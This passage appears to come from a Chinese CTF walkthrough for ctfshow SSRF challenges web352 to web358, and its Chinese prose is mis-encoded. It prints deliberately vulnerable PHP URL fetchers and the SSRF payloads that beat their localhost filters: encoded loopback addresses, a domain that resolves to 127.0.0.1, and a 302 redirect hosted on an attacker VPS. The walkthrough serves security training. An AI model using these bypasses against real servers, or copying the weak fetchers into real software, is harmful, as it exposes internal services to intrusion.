invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">parse_url</span> ( <span class="keyword">string</span> <span class="variable">$url</span> [, <span class="keyword">int</span> <span class="variable">$component</span> = -<span class="number">1</span> ] )</span><br></pre></td></tr></table></figure><p>â€‹æœ¬å‡½æ•°è§£æä¸€ä¸ª URL å¹¶è¿”å›ä¸€ä¸ªå…³è”æ•°ç»„ï¼ŒåŒ…å«åœ¨ URL ä¸­å‡ºç°çš„å„ç§ç»„æˆéƒ¨åˆ†ã€‚</p><p>â€‹è¿™é“é¢˜è¿‡æ»¤äº† localhost å’Œ 127.0.0ï¼Œç»•è¿‡æ–¹å¼æŒºå¤šçš„ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url=http://0x7F.0.0.1/flag.php   16è¿›åˆ¶</span><br><span class="line">url=http://0177.0.0.1/flag.php    8è¿›åˆ¶</span><br><span class="line">url=http://0.0.0.0/flag.php</span><br><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://127.127.127.127/flag.php</span><br></pre></td></tr></table></figure><h1 id="web353"><a class="markdownIt-Anchor" href="#web353">#</a> web353ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.|\ã€‚/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº† 127.0. å’Œå¥å·ï¼Œé‚£ä¹ˆï¼Œç»•è¿‡æœ‰ä¸‹é¢çš„ï¼š<span class="exturl" data-url="aHR0cHM6Ly90b29sLjUyMDEwMS5jb20vd2FuZ2x1by9qaW56aGl6aHVhbmh1YW4v">IP åœ°å€è¿›åˆ¶è½¬æ¢ç½‘ç«™</span></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">åå…­è¿›åˆ¶</span><br><span class="line">url=http://0x7F.0.0.1/flag.php</span><br><span class="line">å…«è¿›åˆ¶</span><br><span class="line">url=http://0177.0.0.1/flag.php</span><br><span class="line">10 è¿›åˆ¶æ•´æ•°æ ¼å¼</span><br><span class="line">url=http://2130706433/flag.php</span><br><span class="line">16 è¿›åˆ¶æ•´æ•°æ ¼å¼ï¼Œè¿˜æ˜¯ä¸Šé¢é‚£ä¸ªç½‘ç«™è½¬æ¢è®°å¾—å‰ç¼€0x</span><br><span class="line">url=http://0x7F000001/flag.php</span><br><span class="line">è¿˜æœ‰ä¸€ç§ç‰¹æ®Šçš„çœç•¥æ¨¡å¼</span><br><span class="line">127.0.0.1å†™æˆ127.1</span><br><span class="line">ç”¨CIDRç»•è¿‡localhost</span><br><span class="line">url=http://127.127.127.127/flag.php</span><br><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://0.0.0.0/flag.php</span><br></pre></td></tr></table></figure><h1 id="web354"><a class="markdownIt-Anchor" href="#web354">#</a> web354ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|1|0|ã€‚/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº† 1 å’Œ 0ï¼Œä¹‹ç±»å¯ä»¥åˆ©ç”¨è§£æåˆ° 127.0.0.1 çš„åŸŸåä½œä¸ºç»•è¿‡æˆ–è€… 302ï¼Œå‰è€…ï¼š<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzYxNzc4MTI4L2FydGljbGUvZGV0YWlscy8xMjM5MjMzMTY/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjJDRDc2ODYyMy1EQjQzLTRFRTMtQTkzRi05REE3QUFCNzBGRTElMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQucGMlMjU1RmFsbC4lMjUyMiUyNTdEJmFtcDtyZXF1ZXN0X2lkPUNENzY4NjIzLURCNDMtNEVFMy1BOTNGLTlEQTdBQUI3MEZFMSZhbXA7Yml6X2lkPTAmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19zZWFyY2hfcmVzdWx0Lm5vbmUtdGFzay1ibG9nLTJ+YWxsfmZpcnN0X3JhbmtfZWNwbV92MX5yYW5rX3YzMV9lY3BtLTEtMTIzOTIzMzE2LW51bGwtbnVsbC4xNDIlNUV2MTAwJTVFcGNfc2VhcmNoX3Jlc3VsdF9iYXNlNiZhbXA7dXRtX3Rlcm09JUU1JThGJUFGJUU0JUJCJUE1JUU4JUE3JUEzJUU2JTlFJTkwJUU1JTg4JUIwMTI3LjAuMC4xJUU3JTlBJTg0JUU1JTlGJTlGJUU1JTkwJThEJmFtcDtzcG09MTAxOC4yMjI2LjMwMDEuNDE4Nw==">SSRF åŸŸåè§£æåˆ° 127.0.0.1</span>ï¼Œ</p><p>â€‹è¿™é‡Œçš„ payload ï¼š<span class="exturl" data-url="aHR0cDovL3NhZmUudGFvYmFvLmNvbS9mbGFnLnBocCVFMyU4MCU4Mg==">http://safe.taobao.com/flag.phpã€‚</span></p><h1 id="web355"><a class="markdownIt-Anchor" href="#web355">#</a> web355ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œè¦æ±‚é•¿åº¦å°äºäº”ï¼Œç›´æ¥ç”¨ http://0/flag.php å»ç»•è¿‡ã€‚</p><h1 id="web356"><a class="markdownIt-Anchor" href="#web356">#</a> web356ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹é•¿åº¦å°äº 3ï¼Œè¿˜æ˜¯ä¸Šä¸€é¢˜é‚£ä¸ª payload ä¸€æŠŠæ¢­ã€‚</p><h1 id="web357"><a class="markdownIt-Anchor" href="#web357">#</a> web357ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹ai çš„è§£é‡Šå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">// å…³é—­PHPçš„é”™è¯¯æŠ¥å‘Šï¼Œè¿™æ„å‘³ç€ä»»ä½•é”™è¯¯æˆ–è­¦å‘Šéƒ½ä¸ä¼šæ˜¾ç¤ºç»™ç”¨æˆ·  </span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// é«˜äº®æ˜¾ç¤ºå½“å‰æ–‡ä»¶çš„æºä»£ç ã€‚è¿™é€šå¸¸ç”¨äºè°ƒè¯•ç›®çš„ï¼Œä½†åœ¨ç”Ÿäº§ç¯å¢ƒä¸­æ˜¾ç¤ºæºä»£ç æ˜¯ä¸å®‰å…¨çš„ã€‚  </span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// ä»POSTè¯·æ±‚ä¸­è·å–åä¸º&#x27;url&#x27;çš„å‚æ•°å€¼ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨å˜é‡$urlä¸­  </span></span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// ä½¿ç”¨parse_urlå‡½æ•°è§£æ$urlï¼Œå¹¶å°†è§£æç»“æœå­˜å‚¨åœ¨æ•°ç»„$xä¸­  </span></span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// æ£€æŸ¥$xæ•°ç»„ä¸­çš„&#x27;scheme&#x27;é”®æ˜¯å¦ç­‰äº&#x27;http&#x27;æˆ–&#x27;https&#x27;  </span></span><br><span class="line"><span class="comment">// è¿™æ˜¯ä¸ºäº†ç¡®ä¿åªå¤„ç†HTTPæˆ–HTTPSåè®®çš„URLï¼Œä»è€Œé¿å…æ½œåœ¨çš„åè®®æ¼æ´ï¼ˆå¦‚URLé‡å®šå‘æ”»å‡»ï¼‰  </span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;  </span><br><span class="line">    <span class="comment">// ä½¿ç”¨gethostbynameå‡½æ•°è·å–$urlä¸­ä¸»æœºåçš„IPåœ°å€ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨å˜é‡$ipä¸­  </span></span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);  </span><br><span class="line">      </span><br><span class="line">    <span class="comment">// è¾“å‡ºè·å–çš„IPåœ°å€ï¼Œå‰é¢åŠ ä¸ŠHTMLçš„æ¢è¡Œæ ‡ç­¾  </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;  </span><br><span class="line">      </span><br><span class="line">    <span class="comment">// ä½¿ç”¨filter_varå‡½æ•°å’ŒFILTER_VALIDATE_IPè¿‡æ»¤å™¨æ¥éªŒè¯$ipæ˜¯å¦ä¸ºæœ‰æ•ˆçš„IPåœ°å€  </span></span><br><span class="line">    <span class="comment">// åŒæ—¶ï¼Œä½¿ç”¨FILTER_FLAG_NO_PRIV_RANGEå’ŒFILTER_FLAG_NO_RES_RANGEæ ‡å¿—æ¥æ’é™¤ç§æœ‰å’Œä¿ç•™çš„IPåœ°å€èŒƒå›´  </span></span><br><span class="line">    <span class="comment">// å¦‚æœ$ipä¸æ˜¯æœ‰æ•ˆçš„éç§æœ‰/éä¿ç•™IPåœ°å€ï¼Œåˆ™æ‰§è¡Œdieå‡½æ•°ï¼Œç»ˆæ­¢è„šæœ¬æ‰§è¡Œå¹¶è¾“å‡º&#x27;ip!&#x27;  </span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">      </span><br><span class="line">    <span class="comment">// å¦‚æœIPåœ°å€éªŒè¯é€šè¿‡ï¼Œåˆ™ä½¿ç”¨file_get_contentså‡½æ•°å°è¯•ä»ç”¨æˆ·æäº¤çš„URLä¸­è·å–å†…å®¹ï¼Œå¹¶è¾“å‡º  </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="comment">// å¦‚æœ$urlçš„åè®®ä¸æ˜¯HTTPæˆ–HTTPSï¼Œåˆ™æ‰§è¡Œdieå‡½æ•°ï¼Œç»ˆæ­¢è„šæœ¬æ‰§è¡Œå¹¶è¾“å‡º&#x27;scheme&#x27;  </span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œæ‰“ 302 è·³è½¬ï¼Œåœ¨å…¬ç½‘æœåŠ¡å™¨ä¸Šå†™å…¥å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1:80/flag.php&quot;</span>,<span class="literal">TRUE</span>,<span class="number">302</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ä¸´æ—¶è¿è¡Œï¼š</p><blockquote><p>php -S 0.0.0.0:2333</p></blockquote><p>â€‹ä¼ å…¥ url å‚æ•°ä¸ºï¼š</p><blockquote><p>url=http://&lt;vps_ip&gt;: ç«¯å£</p></blockquote><h1 id="web358"><a class="markdownIt-Anchor" href="#web358">#</a> web358ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ 